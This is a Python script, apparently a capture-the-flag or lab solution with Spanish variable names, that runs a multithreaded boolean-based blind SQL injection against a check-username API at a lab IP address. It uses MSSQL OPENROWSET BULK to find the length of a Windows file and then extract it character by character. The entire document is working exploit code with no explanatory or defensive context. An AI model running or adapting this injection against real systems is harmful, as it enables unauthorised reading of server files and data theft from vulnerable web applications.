import requests
import threading
import json

evento = threading.Event()

def n_caracteres(payload,i,length):
	respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or ({payload})={i}--")
	if (json.loads(respuesta.text))['status'] == 'taken':
		length.append(i)
		evento.set()

def test(payload,n_hilos=20):
	length=[]
	threads=[]
	for i in range(0,100):
		if evento.is_set():
			evento.clear()
			break
		if len(threads) >= n_hilos:
			for l in threads:
				l.start()
			for l in threads:
				l.join()
			threads = []
		threads.append(threading.Thread(target=n_caracteres,args=(payload,i,length)))
	return length[0]

def contenido(i,j,file):
	payload = f"SELECT SUBSTRING(BulkColumn,{i},1) FROM OPENROWSET(BULK 'C:\\Windows\\System32\\flag.txt', SINGLE_CLOB) AS x"
	respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or ({payload})='{j}'--")
	if (json.loads(respuesta.text))['status'] == 'taken':
		file.append(j)
		evento.set()

def test1(length,n_hilos=20):
	threads = []
	file = []
	wordlist = "abcdefghijklmnopqrstuvwxyz0123456789@{}ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	for i in range(0,length+1):
		for j in wordlist:
			if evento.is_set():
				evento.clear()
				break
			if len(threads) >= n_hilos:
				for l in threads:
					l.start()
				for l in threads:
					l.join()
				threads = []
			threads.append(threading.Thread(target=contenido,args=(i,j.strip(),file)))
	resultado = ''.join(file)
	return resultado

payload = "SELECT LEN(BulkColumn) FROM OPENROWSET(BULK 'C:\\Windows\\System32\\flag.txt', SINGLE_CLOB) AS x"
length = test(payload)
print(f"El contenido del archivo 'C:\\Windows\\System32\\flag.txt' es : {test1(length)}")
